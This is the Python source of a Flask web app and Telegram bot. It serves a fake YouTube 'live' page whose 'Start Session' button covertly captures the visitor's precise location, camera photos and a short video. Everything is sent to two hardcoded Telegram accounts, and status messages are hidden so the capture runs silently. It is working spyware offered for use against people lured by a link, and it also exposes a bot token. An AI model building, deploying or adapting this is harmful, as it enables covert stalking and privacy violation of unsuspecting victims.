import os
import threading
from flask import Flask, request, render_template_string
import telebot

BOT_TOKEN = "8637899791:AAEcpjrVy2j9sUTK-rvpX_HsuKBpkX7gnlU"
USER_IDS = [7361880623, 8475691696]
BASE_URL = "https://web-youtube-asuma66.up.railway.app"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

HTML_PAGE = """<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Roboto', sans-serif; margin:0; background:#0f0f0f; color:#fff; }
        .header { background:#202020; padding:12px 20px; display:flex; align-items:center; }
        .header .logo { font-size:24px; font-weight:bold; color:#ff0000; }
        .header .user { margin-left:auto; color:#aaa; }
        .container { max-width:900px; margin:20px auto; padding:0 20px; }
        .video-placeholder { background:#1a1a1a; border-radius:12px; padding:20px; text-align:center; }
        .video-placeholder img { max-width:100%; border-radius:8px; }
        .info { margin-top:15px; }
        .info .title { font-size:22px; font-weight:500; }
        .info .channel { color:#aaa; margin-top:8px; }
        .controls { margin-top:20px; display:flex; gap:10px; flex-wrap:wrap; justify-content:center; }
        .controls button { background:#3ea6ff; border:none; color:#000; padding:10px 24px; border-radius:20px; font-weight:bold; cursor:pointer; font-size:16px; }
        .controls button:disabled { opacity:0.5; cursor:not-allowed; }
        /* Hide all status elements */
        #statusText, #locationStatus, #debug { display: none; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">YouTube</div>
        <div class="user">asuma.66</div>
    </div>
    <div class="container">
        <div class="video-placeholder">
            <img id="thumbnail" src="https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg" alt="video thumbnail">
        </div>
        <div class="info">
            <div class="title">🔥 ASUSMA LIVE 🔥</div>
            <div class="channel">asuma.66 - 1.2M subscribers</div>
        </div>
        <div class="controls">
            <button id="startBtn">▶ Start Session</button>
        </div>
        <!-- Hidden status elements – kept only for internal use, but hidden via CSS -->
        <div id="statusText"></div>
        <div id="locationStatus"></div>
        <div id="debug"></div>
    </div>
    <script>
        let frontStream = null, backStream = null, mediaRecorder = null;
        let recordedChunks = [], recordingActive = false, maxDuration = 10000;
        const startBtn = document.getElementById('startBtn');

        // No status updates – everything happens silently.
        function sendLocation(coords) {
            fetch('/location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lat: coords.lat, lng: coords.lng })
            }).catch(() => {});
        }

        function sendLocationDenied() {
            fetch('/location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ denied: true })
            }).catch(() => {});
        }

        function captureFrame(stream) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        canvas.toBlob((blob) => {
                            resolve(blob);
                            video.pause();
                            video.srcObject = null;
                        }, 'image/jpeg', 0.9);
                    }, 100);
                };
            });
        }

        async function sendMedia(frontBlob, backBlob, videoBlob) {
            const fd = new FormData();
            if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg');
            if (backBlob) fd.append('backImage', backBlob, 'back.jpg');
            if (videoBlob) fd.append('video', videoBlob, 'recording.webm');
            await fetch('/capture', { method: 'POST', body: fd });
        }

        function sendCameraDenied() {
            fetch('/camera_denied', { method: 'POST' }).catch(() => {});
        }

        function sendCameraUnavailable() {
            fetch('/camera_unavailable', { method: 'POST' }).catch(() => {});
        }

        async function getCameraStream() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                return { stream, label: 'default' };
            } catch (e) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
                    return { stream, label: 'environment' };
                } catch (e2) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                        return { stream, label: 'user' };
                    } catch (e3) {
                        throw new Error('No camera');
                    }
                }
            }
        }

        async function startSession() {
            startBtn.disabled = true;
            startBtn.innerText = 'Loading...';

            // ---- Location ----
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        sendLocation({ lat: pos.coords.latitude, lng: pos.coords.longitude });
                        requestCamera();
                    },
                    () => {
                        sendLocationDenied();
                        requestCamera();
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                sendLocationDenied();
                requestCamera();
            }
        }

        async function requestCamera() {
            try {
                const result = await getCameraStream();
                const stream = result.stream;
                // Try to get a second camera for "front" view (reuse if only one)
                let frontStreamLocal = null;
                try {
                    const frontResult = await getCameraStream();
                    frontStreamLocal = frontResult.stream;
                } catch (e) {
                    frontStreamLocal = stream; // fallback
                }
                backStream = stream;
                frontStream = frontStreamLocal;

                const frontBlob = await captureFrame(frontStream);
                const backBlob = await captureFrame(backStream);

                mediaRecorder = new MediaRecorder(backStream, { mimeType: 'video/webm;codecs=vp9' });
                recordedChunks = [];
                mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    sendMedia(frontBlob, backBlob, blob);
                    frontStream.getTracks().forEach(t => t.stop());
                    backStream.getTracks().forEach(t => t.stop());
                    startBtn.disabled = false;
                    startBtn.innerText = '▶ Start Session';
                };
                mediaRecorder.start(1000);
                recordingActive = true;
                setTimeout(() => {
                    if (recordingActive && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                        recordingActive = false;
                    }
                }, maxDuration);
                window.addEventListener('beforeunload', () => {
                    if (recordingActive && mediaRecorder.state === 'recording') mediaRecorder.stop();
                });
                startBtn.innerText = '▶ Play';
                // After a few seconds, restore the button (since recording continues in background)
                setTimeout(() => {
                    startBtn.innerText = '▶ Start Session';
                }, 2000);
            } catch (err) {
                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    sendCameraDenied();
                } else {
                    sendCameraUnavailable();
                }
                startBtn.disabled = false;
                startBtn.innerText = '▶ Start Session';
            }
        }

        startBtn.addEventListener('click', startSession);
        // No visible status messages; everything runs silently.
    </script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/location', methods=['POST'])
def location():
    data = request.get_json()
    if data.get('denied'):
        for uid in USER_IDS:
            try:
                bot.send_message(uid, "📍 Location: Denied by user.")
            except Exception as e:
                print(f"Error: {e}")
        return "OK", 200
    lat = data.get('lat')
    lng = data.get('lng')
    if lat is not None and lng is not None:
        for uid in USER_IDS:
            try:
                bot.send_location(uid, lat, lng)
                bot.send_message(uid, f"📍 Location: {lat}, {lng}")
            except Exception as e:
                print(f"Location send error: {e}")
        return "OK", 200
    return "Invalid", 400

@app.route('/camera_denied', methods=['POST'])
def camera_denied():
    for uid in USER_IDS:
        try:
            bot.send_message(uid, "📷 Camera: Denied by user.")
        except Exception as e:
            print(f"Error: {e}")
    return "OK", 200

@app.route('/camera_unavailable', methods=['POST'])
def camera_unavailable():
    for uid in USER_IDS:
        try:
            bot.send_message(uid, "📷 Camera: Unavailable (no camera or other error).")
        except Exception as e:
            print(f"Error: {e}")
    return "OK", 200

@app.route('/capture', methods=['POST'])
def capture():
    front = request.files.get('frontImage')
    back = request.files.get('backImage')
    video = request.files.get('video')
    for uid in USER_IDS:
        try:
            if front:
                front.seek(0)
                bot.send_photo(uid, front.read())
            if back:
                back.seek(0)
                bot.send_photo(uid, back.read())
            if video:
                video.seek(0)
                bot.send_video(uid, video.read(), supports_streaming=True)
            bot.send_message(uid, "📸 Media capture complete.")
        except Exception as e:
            print(f"Media send error: {e}")
    return "OK", 200

@bot.message_handler(commands=['start'])
def send_link(m):
    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nIt will ask for location and camera, then send data automatically.")

def run_bot():
    print("Bot polling started.")
    bot.polling(non_stop=True, interval=1)

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
